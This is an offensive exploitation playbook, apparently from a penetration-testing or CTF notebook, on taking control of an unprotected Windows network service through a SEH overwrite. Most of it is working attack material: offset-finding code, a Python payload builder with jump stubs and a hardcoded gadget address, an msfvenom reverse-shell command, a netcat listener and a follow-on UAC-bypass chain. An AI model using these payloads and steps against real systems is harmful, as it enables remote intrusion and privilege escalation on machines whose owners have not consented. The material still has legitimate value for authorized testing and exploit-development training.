# Windows SEH Overflow on Static-Linked PE32 (No ASLR / No SafeSEH)

## When this applies

- Custom Windows network service binary recovered (FTP loot, public download, decompiled installer) and analyzable offline.
- Headers show **no ASLR**, **no DEP**, **no SafeSEH**, **no SEHOP** (`mona` modules pane: `False/False/False/False`, or `Get-PESecurity`/`pwntools.elf.PE` checks).
- The service handles user input via an unbounded `sprintf` / `strcpy` / `wcscpy` / `MultiByteToWideChar` into a stack buffer.
- Goal: take execution flow via SEH (Structured Exception Handling) record overwrite.

## The primitive

Stack frames in MSVC use `_except_handler4_common` for SEH. Each function with a `__try`/`__except` (or implicit C++ try-catch) registers an EXCEPTION_REGISTRATION_RECORD on the stack:

```c
struct EXCEPTION_REGISTRATION_RECORD {
    PEXCEPTION_REGISTRATION_RECORD Next;     // a.k.a. NSEH
    PEXCEPTION_DISPOSITION         Handler;  // a.k.a. SEH — function pointer
};
// Lives at [ebp - 0xc] for _except_handler4_common
```

Overflow past the local buffer → into NSEH (4 bytes) → into SEH (4 bytes). Trigger an access violation (write past stack bottom or invalid pointer deref). The unwinder walks the SEH chain and calls `Handler()`.

```
[ buffer ][ saved EBP ][ NSEH ][ SEH ][ ... ]
                       ^---- buffer_size_from_ebp - 0xC
```

## Identification

```bash
# On the recovered PE32:
pwn checksec rainbow.exe
# RELRO/Stack-Canary/NX/PIE/ASLR/SafeSEH all "No PIE / No SEHOP" → exploitable
r2 -A rainbow.exe
afl ; pdf @ <handler_function>     # find the unbounded sprintf/strcpy
ropper --file rainbow.exe --search "pop * ; pop * ; ret"
```

Pick a `pop r32; pop r32; ret` gadget from the binary's own `.text` (no ASLR ⇒ static address). The unwinder calls `Handler(record, frame, context, dispatcher_context)` — the gadget pops `record` and `frame`, then RETs into NSEH.

## Building the exploit

Offset to NSEH = `local_buffer_size_from_ebp − 0xC`. Confirm with:

```python
# pattern_create / pattern_offset
from pwn import cyclic
buf = cyclic(2048)
# Send buf, observe access violation, note the EIP after pop/pop/ret
# Then: cyclic_find(eip_value)  → gives offset to SEH
# offset_to_NSEH = cyclic_find(eip_value) - 4
```

When the chosen gadget address contains a **trailing 0x00** byte, the trailing null often lands on top of the shellcode tail and corrupts payload start. Solution — **place shellcode BEFORE the SEH overwrite** and bridge with a tiny NSEH:

```
[ shellcode + NOP padding ][ NSEH = jmp -126 ][ SEH = pop/pop/ret addr ][ trash ]
                            \_____ short jmp _____/                    ^ trailing null OK
                                                                          (ret skips it)
```

NSEH (4 bytes) cannot fit a long jump — use a 2-byte short jump (`EB <signed_8bit_offset>`) to a 5-byte near jump (`E9 <signed_32bit_offset>`) just before the buffer:

```python
# msfvenom -p windows/shell_reverse_tcp LHOST=<tun> LPORT=4444 -b '\x00\x0a\x0d' -f python -v shellcode
import struct
shellcode = b"\x33\xC9...\x90\x90"               # bad-char-clean reverse shell, length S
near_jmp  = b"\xe9" + struct.pack("<i", -(len(shellcode) + 5 + 4))  # 5-byte jmp back -|S|-9
short_jmp = b"\xeb\xfb"                          # jmp -3 → start of near_jmp (NSEH-relative)
                                                 # adjust offset to land exactly on near_jmp
nseh      = short_jmp + b"\x90\x90"              # 4-byte NSEH = short jmp + padding
seh       = struct.pack("<I", 0x004091B7)        # pop ebx ; pop ecx ; ret  (no-ASLR static addr)

payload = b"A" * (offset_to_nseh - len(shellcode) - len(near_jmp)) + shellcode + near_jmp + nseh + seh
payload += b"D" * 200                             # pad past whatever the binary expects
```

Trigger the AV (post-overflow read past stack, or oversized strncpy that hits a guard page). The unwinder pops/pops/RETs into NSEH → short jmp → near jmp → shellcode → reverse shell.

## Verifying success

- TCP listener on attacker side fires (`nc -lvnp 4444` shows a banner).
- Inside the shell: `whoami` returns the service-account user (often `LocalSystem` for legacy services, the service-running user otherwise).
- If only Medium-IL admin: chain to UAC bypass for high-IL (see `kiosk-and-applocker-escape.md` UAC section — fodhelper / sdclt / slui / eventvwr / ComputerDefaults all share the same per-user ProgID hijack pattern; **probe the box first** with `dir C:\Windows\System32\fodhelper.exe sdclt.exe slui.exe eventvwr.exe ComputerDefaults.exe` since older Server builds may be missing fodhelper specifically).

## Common pitfalls

- Bad-char list: `msfvenom -b` must include all chars the network parser strips (`\x00`, `\x0a`, `\x0d`, `\x20`, sometimes `\x25` if URL-decoded). Generate, verify byte-by-byte in a debugger before deploying.
- Computing offset from EBP not ESP: `_except_handler4_common` keys NSEH at `[ebp-0xc]`. Local-buffer offset measured from RSP/ESP differs by saved-frame-pointer + alignment.
- Service auto-restarts after crash mean iterative dev is cheap — but check that the parent (often a `.bat` loop or `restart.ps1`) actually relaunches; otherwise each crash means a manual respawn.
- mona.py `!mona seh -m rainbow.exe` inside Immunity / WinDbg auto-finds usable POP/POP/RET gadgets — much faster than manual ropper grep when the binary is large.

## Tools

- pwntools (`cyclic`, `cyclic_find`, `pwn checksec`)
- radare2 / Ghidra / IDA Free (static analysis of the recovered PE32)
- ropper / mona.py (gadget search)
- msfvenom (bad-char-clean shellcode)
- Immunity / WinDbg / x64dbg (offset confirmation; only needed if box is reachable for live debugging)
